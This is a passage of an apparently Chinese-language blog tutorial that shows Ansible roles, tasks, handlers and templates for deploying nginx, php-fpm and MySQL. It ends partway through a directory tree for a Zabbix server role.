class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#task文件</span><br>[17:55:17 root@ansible-rocky roles]$ <span class="hljs-built_in">cat</span> nginx/tasks/main.yml <br>- name: add group nginx<br>  group: name=nginx system=<span class="hljs-built_in">yes</span> gid=80<br><br>- name: add user nginx<br>  user: name=nginx group=nginx uid=80 system=<span class="hljs-built_in">yes</span> shell=<span class="hljs-string">&quot;/sbin/nologin&quot;</span> create_home=no<br><br>- name: install dependent package<br>  yum: name=&#123;&#123;item&#125;&#125; state=latest<br>  loop:<br>    - gcc<br>    - make<br>    - pcre-devel<br>    - openssl-devel<br>    - zlib-devel<br>    - perl-ExtUtils-Embed<br><br>- name: get nginx <span class="hljs-built_in">source</span><br>  unarchive:<br>    src: <span class="hljs-string">&quot;&#123;&#123; url &#125;&#125;&quot;</span><br>    dest: <span class="hljs-string">&quot;/usr/local/src&quot;</span><br>    remote_src: <span class="hljs-built_in">yes</span><br><br>- name: compile and install<br>  shell:<br>    cmd: <span class="hljs-string">&quot;./configure --prefix=&#123;&#123;install_dir&#125;&#125; --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module &amp;&amp; make &amp;&amp; make install&quot;</span><br>    <span class="hljs-built_in">chdir</span>: <span class="hljs-string">&quot;/usr/local/src/nginx-&#123;&#123; version &#125;&#125;&quot;</span><br>    creates: <span class="hljs-string">&quot;&#123;&#123;install_dir&#125;&#125;/sbin/nginx&quot;</span><br><br>- name: config file<br>  template:<br>    src: nginx.conf.j2<br>    dest: <span class="hljs-string">&quot;&#123;&#123;install_dir&#125;&#125;/conf/nginx.conf&quot;</span><br>    owner: nginx<br>    group: nginx<br>  notify: restart service<br>  tags:<br>    - config<br><br>- name: create directory<br>  file:<br>    path: <span class="hljs-string">&quot;&#123;&#123;install_dir&#125;&#125;/conf/conf.d&quot;</span><br>    state: directory<br>    owner: nginx<br>    group: nginx<br><br>- name: change install directory owner<br>  file:<br>    path: <span class="hljs-string">&quot;&#123;&#123;install_dir&#125;&#125;&quot;</span><br>    owner: nginx<br>    group: nginx<br>    recurse: <span class="hljs-built_in">yes</span><br><br>- name: copy service file<br>  template:<br>    src: nginx.service.j2<br>    dest: <span class="hljs-string">&quot;/lib/systemd/system/nginx.service&quot;</span><br><br>- name: check config<br>  shell:<br>    cmd: <span class="hljs-string">&quot;&#123;&#123;install_dir&#125;&#125;/sbin/nginx -t&quot;</span><br>  register: check_nginx_config<br>  changed_when:<br>    - check_nginx_config.stdout.find(<span class="hljs-string">&#x27;successful&#x27;</span>)<br>    - <span class="hljs-literal">false</span><br><br>- name: start service<br>  systemd:<br>    daemon_reload: <span class="hljs-built_in">yes</span><br>    name: nginx.service<br>    state: started<br>    enabled: <span class="hljs-built_in">yes</span><br>      <br><span class="hljs-comment">#创建handler文件</span><br>[17:59:27 root@ansible-rocky roles]$ <span class="hljs-built_in">cat</span> nginx/handlers/main.yml <br>- name: restart service<br>  service:<br>    name: nginx<br>    state: restarted<br><br><span class="hljs-comment">#准备两个template文件</span><br>[17:59:51 root@ansible-rocky roles]$ <span class="hljs-built_in">cat</span> nginx/templates/nginx.conf.j2 <br><br><span class="hljs-comment">#user  nobody;</span><br>user nginx;<br>worker_processes  &#123;&#123; ansible_processor_vcpus*2 &#125;&#125;;<br>events &#123;<br>    worker_connections  1024;<br>&#125;<br>http &#123;<br>    include       mime.types;<br>    default_type  application/octet-stream;<br>    log_format  access_json <span class="hljs-string">&#x27;&#123;&quot;@timestamp&quot;:&quot;$time_iso8601&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;host&quot;:&quot;$server_addr&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;clientip&quot;:&quot;$remote_addr&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;size&quot;:$body_bytes_sent,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;responsetime&quot;:$request_time,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;upstreamtime&quot;:&quot;$upstream_response_time&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;upstreamhost&quot;:&quot;$upstream_addr&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;http_host&quot;:&quot;$host&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;uri&quot;:&quot;$uri&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;xff&quot;:&quot;$http_x_forwarded_for&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;referer&quot;:&quot;$http_referer&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;tcp_xff&quot;:&quot;$proxy_protocol_addr&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;http_user_agent&quot;:&quot;$http_user_agent&quot;,&#x27;</span><br>        <span class="hljs-string">&#x27;&quot;status&quot;:&quot;$status&quot;&#125;&#x27;</span>;<br>    <span class="hljs-comment"># logging                                                                                          </span><br>    access_log &#123;&#123;install_dir&#125;&#125;/logs/access-json.log access_json;<br>    error_log &#123;&#123;install_dir&#125;&#125;/logs/error.log warn;<br><br>    keepalive_timeout  65;<br>    include &#123;&#123;install_dir&#125;&#125;/conf/conf.d/*.conf;<br>&#125;<br>[18:00:28 root@ansible-rocky roles]$ <span class="hljs-built_in">cat</span> nginx/templates/nginx.service.j2 <br>[Unit]<br>Description=The nginx HTTP and reverse proxy server<br>After=network.target remote-fs.target nss-lookup.target<br><br>[Service]<br>Type=forking<br>PIDFile=&#123;&#123;install_dir&#125;&#125;/logs/nginx.pid<br>ExecStartPre=/bin/rm -f &#123;&#123;install_dir&#125;&#125;/logs/nginx.pid<br>ExecStartPre=&#123;&#123;install_dir&#125;&#125;/sbin/nginx -t<br>ExecStart=&#123;&#123;install_dir&#125;&#125;/sbin/nginx<br>ExecReload=/bin/kill -s HUP \<span class="hljs-variable">$MAINPID</span><br>KillSignal=SIGQUIT<br>TimeoutStopSec=5<br>KillMode=process<br>PrivateTmp=<span class="hljs-literal">true</span>                                                                                        <br>LimitNOFILE=100000<br><br>[Install]<br>WantedBy=multi-user.target<br><br><span class="hljs-comment">#总入口playbook文件</span><br>[18:09:50 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/nginx_role.yml <br>- hosts: websrvs<br>  remote_user: root<br><br>  roles:<br>    - nginx<br></code></pre></td></tr></table></figure><h4 id="4-1-4-实现php-fpm角色"><a href="#4-1-4-实现php-fpm角色" class="headerlink" title="4.1.4 实现php-fpm角色"></a>4.1.4 实现php-fpm角色</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#首先准备php.ini.j2和www.conf文件</span><br><span class="hljs-comment">#修改php上传限制配置</span><br>[17:04:11 root@ansible-rocky ~]$ vi /opt/roles/php-fpm/templates/php.ini.j2<br>post_max_size = 100M <span class="hljs-comment">#将次行从8M修改为100M</span><br>upload_max_filesize = 100M <span class="hljs-comment">#将此行从2M改为100M</span><br><br><span class="hljs-comment">#修改配置文件</span><br>[17:14:03 root@proxy ~]$ vi /opt/roles/php-fpm/files/www.conf<br>user = nginx <span class="hljs-comment">#修改为nginx</span><br>group = nginx <span class="hljs-comment">#修改为nginx</span><br>;listen = /run/php-fpm/www.sock <span class="hljs-comment">#注释此行</span><br>listen = 127.0.0.1:9000 <span class="hljs-comment">#添加此行，监控本机的9000端口</span><br><br><span class="hljs-comment">#准备网页配置文件</span><br>[19:51:32 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/php-fpm/templates/php-fpm.conf.j2 <br>server &#123;<br>    listen 80;<br>    server_name &#123;&#123; fqdn &#125;&#125;;<br>    location / &#123;<br>        root           &#123;&#123; root_path  &#125;&#125;;<br>        fastcgi_pass   127.0.0.1:9000;<br>        fastcgi_index  index.php;<br>        fastcgi_param  SCRIPT_FILENAME $document_root<span class="hljs-variable">$fastcgi_script_name</span>;<br>        include        fastcgi_params;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">#准备tasks文件</span><br>[19:40:32 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/php-fpm/tasks/main.yml<br>- name: install package<br>  yum:<br>    name: <span class="hljs-string">&quot;&#123;&#123; item &#125;&#125;&quot;</span><br>  loop:<br>    - php-fpm<br>    - php-mysqlnd<br>    - php-json<br>    - php-xml<br>    - php-gd<br>    - php-pecl-zip<br><br>- name: php path permissions<br>  file:<br>    path: /var/lib/php/<br>    owner: nginx<br>    group: nginx<br>    recurse: <span class="hljs-built_in">yes</span><br><br>- name: config php.ini<br>  template:<br>    src: php.ini.j2<br>    dest: /etc/php.ini<br><br>- name: config www.conf<br>  copy:<br>    src: www.conf<br>    dest: /etc/php-fpm.d/www.conf<br><br>- name: website config<br>  template:<br>    src: php-fpm.conf.j2<br>    dest: <span class="hljs-string">&quot;&#123;&#123; install_dir &#125;&#125;/conf/conf.d/php-fpm.conf&quot;</span><br>    owner: nginx<br>    group: nginx<br>  notify: restart nginx<br><br>- name: start service<br>  service:<br>    name: php-fpm<br>    state: started<br>    enabled: <span class="hljs-built_in">yes</span><br>    <br><span class="hljs-comment">#准备handler文件</span><br>[19:53:47 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/roles/php-fpm/handlers/main.yml <br>- name: restart nginx<br>  service:<br>    name: nginx<br>    state: restarted<br>    <br><span class="hljs-comment">#准备总入口playbook文件</span><br>[19:54:48 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> /opt/php-fpm_role.yml <br>- hosts: websrvs<br>  remote_user: root<br><br>  roles:<br>    - php-fpm<br></code></pre></td></tr></table></figure><h4 id="4-1-5-实现MySQL角色"><a href="#4-1-5-实现MySQL角色" class="headerlink" title="4.1.5 实现MySQL角色"></a>4.1.5 实现MySQL角色</h4><p><strong>注意：ansible playbook调用mysql系列模块需要依赖python3-mysql包和利用pip安装pymysql</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#下载准备mysql源文件包</span><br>[18:22:54 root@ansible-rocky opt]$ <span class="hljs-built_in">ls</span> roles/mysql/files/<br>mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz<br><br><span class="hljs-comment">#创建task文件</span><br>[18:24:40 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> roles/mysql/tasks/main.yml <br>- name: install dependent package<br>  yum:<br>    name: <span class="hljs-string">&quot;&#123;&#123; item &#125;&#125;&quot;</span><br>  loop:<br>    - libaio<br>    - numactl-libs<br>    - python39<br>    - python3-mysql<br><br>- name: install pymysql<br>  pip:<br>    name: pymysql<br>    state: present<br>    <br>- name: create mysql group<br>  group: name=&#123;&#123;db_group&#125;&#125; gid=&#123;&#123;db_gid&#125;&#125;<br><br>- name: create mysql user<br>  user: name=&#123;&#123;db_user&#125;&#125; uid=&#123;&#123;db_uid&#125;&#125; system=<span class="hljs-built_in">yes</span> shell=<span class="hljs-string">&quot;/sbin/nologin&quot;</span> create_home=no group=&#123;&#123;db_group&#125;&#125;<br><br>- name: copy tar to remote host and file mode<br>  unarchive:<br>    src: <span class="hljs-string">&quot;&#123;&#123; db_file &#125;&#125;&quot;</span><br>    dest: <span class="hljs-string">&quot;/usr/local/&quot;</span><br>    owner: root<br>    group: root<br><br>- name: create lingfile /usr/local/mysql<br>  file:<br>    src: <span class="hljs-string">&quot;/usr/local/mysql-&#123;&#123; db_version &#125;&#125;-linux-glibc2.12-x86_64&quot;</span><br>    dest: <span class="hljs-string">&quot;/usr/local/mysql&quot;</span><br>    state: <span class="hljs-built_in">link</span><br><br>- name: path file<br>  copy:<br>    content: <span class="hljs-string">&quot;PATH=/usr/local/mysql/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br>    dest: <span class="hljs-string">&quot;/etc/profile.d/mysql.sh&quot;</span><br><br>- name: config file<br>  template:<br>    src: my.cnf.j2<br>    dest: <span class="hljs-string">&quot;/etc/my.cnf&quot;</span><br><br>- name: create directory<br>  file:<br>    name: <span class="hljs-string">&quot;/data&quot;</span><br>    state: directory<br><br>- name: init mysql data<br>  shell:<br>    cmd: <span class="hljs-string">&quot;/usr/local/mysql/bin/mysqld --initialize-insecure --user=&#123;&#123; db_user &#125;&#125; --datadir=&#123;&#123; db_data_dir &#125;&#125;&quot;</span><br>  tags:<br>    - init<br><br>- name: service script<br>  copy:<br>    src: <span class="hljs-string">&quot;/usr/local/mysql/support-files/mysql.server&quot;</span><br>    dest: <span class="hljs-string">&quot;/etc/init.d/mysqld&quot;</span><br>    remote_src: <span class="hljs-built_in">yes</span><br>    mode: <span class="hljs-string">&#x27;+x&#x27;</span><br><br>- name: start service<br>  shell:<br>    cmd: chkconfig --add mysqld;chkconfig mysqld on;service mysqld start<br><br>- name: change root password<br>  shell:<br>    cmd: <span class="hljs-string">&quot;/usr/local/mysql/bin/mysqladmin -uroot password &#123;&#123; db_root_passwd &#125;&#125;&quot;</span><br>    <br>- name: create &#123;&#123; wp_db_name &#125;&#125; database<br>  mysql_db:<br>    login_host: <span class="hljs-string">&quot;localhost&quot;</span><br>    login_user: <span class="hljs-string">&quot;root&quot;</span><br>    login_password: <span class="hljs-string">&quot;&#123;&#123; db_root_passwd &#125;&#125;&quot;</span><br>    login_port: 3306<br>    login_unix_socket: <span class="hljs-string">&quot;&#123;&#123; db_data_dir &#125;&#125;/mysql.sock&quot;</span><br>    name: <span class="hljs-string">&quot;&#123;&#123; wp_db_name &#125;&#125;&quot;</span><br>    state: present<br>  when: <span class="hljs-string">&quot;&#123;&#123; wp_db_name &#125;&#125; is defined&quot;</span><br><br>- name: create &#123;&#123; wp_db_user &#125;&#125;<br>  mysql_user:<br>    login_host: <span class="hljs-string">&quot;localhost&quot;</span><br>    login_user: <span class="hljs-string">&quot;root&quot;</span><br>    login_password: <span class="hljs-string">&quot;&#123;&#123; db_root_passwd &#125;&#125;&quot;</span><br>    login_port: 3306<br>    login_unix_socket: <span class="hljs-string">&quot;&#123;&#123; db_data_dir &#125;&#125;/mysql.sock&quot;</span><br>    name: <span class="hljs-string">&quot;&#123;&#123; wp_db_user&#125;&#125;&quot;</span><br>    password: <span class="hljs-string">&quot;&#123;&#123; wp_db_passwd &#125;&#125;&quot;</span><br>    priv: <span class="hljs-string">&quot;&#123;&#123; wp_db_name &#125;&#125;.*:ALL&quot;</span><br>    host: <span class="hljs-string">&quot;10.0.0.%&quot;</span><br>    state: present<br>  when: <span class="hljs-string">&quot;&#123;&#123; wp_db_user &#125;&#125; is defined&quot;</span><br>    <br>    <br><span class="hljs-comment">#准备MySQL 配置文件模板</span><br>[18:25:25 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> roles/mysql/templates/my.cnf.j2 <br>[mysqld]<br>server-id=1<br>log-bin<br>datadir=&#123;&#123; db_data_dir &#125;&#125;<br>socket=&#123;&#123; db_data_dir &#125;&#125;/mysql.sock<br>log-error=&#123;&#123; db_data_dir &#125;&#125;/mysql.log<br>pid-file=&#123;&#123; db_data_dir &#125;&#125;/mysql.pid<br><br>[client]<br>socket=&#123;&#123; db_data_dir &#125;&#125;/mysql.sock<br><br><span class="hljs-comment">#准备总入口playbook文件</span><br>[18:25:38 root@ansible-rocky opt]$ <span class="hljs-built_in">cat</span> mysql_role.yml <br>- hosts: dbsrvs<br>  remote_user: root<br>  gather_facts: no<br><br>  roles:<br>    - mysql<br></code></pre></td></tr></table></figure><h3 id="4-2-基于zabbix角色批量部署zabbix"><a href="#4-2-基于zabbix角色批量部署zabbix" class="headerlink" title="4.2 基于zabbix角色批量部署zabbix"></a>4.2 基于zabbix角色批量部署zabbix</h3><p><strong>依赖上面搭建好的LNMP架构实现</strong></p><h4 id="4-2-1-部署zabbix-server"><a href="#4-2-1-部署zabbix-server" class="headerlink" title="4.2.1 部署zabbix-server"></a>4.2.1 部署zabbix-server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#总体目录结构</span><br>[20:27:58 root@ansible-rocky opt]$ tree<br>.<br>├── ansible.cfg<br>├── hosts<br>├── hosts_zabbix<br>├── roles<br>│   ├── mysql<br>│   │   ├── files<br>│   │   │   ├── create.sql.gz<br>│   │   │   └── mysql-8.0.31-linux-glibc2.12-x86_64.tar.xz<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       └── my.cnf.j2<br>│   ├── nginx<br>│   │   ├── files<br>│   │   ├── handlers<br>│   │   │   └── main.yml<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       ├── nginx.conf.j2<br>│   │       └── nginx.service.j2<br>│   ├── php-fpm<br>│   │   ├── files<br>│   │   │   ├── test.php<br>│   │   │   └── www.conf<br>│   │   ├── handlers<br>│   │   │   └── main.yml<br>│   │   ├── tasks<br>│   │   │   └── main.yml<br>│   │   └── templates<br>│   │       ├── php-fpm.conf.j2<br>│   │       └── php.ini.j2<br>│   └── zabbix_server<br>│       ├── handlers<br>│       │   └── main.yml<br>│       ├── tasks<br>│       │   └── main.yml<br>│       └── templates<br>│           ├── zabbix.conf.j2<br>│           ├── 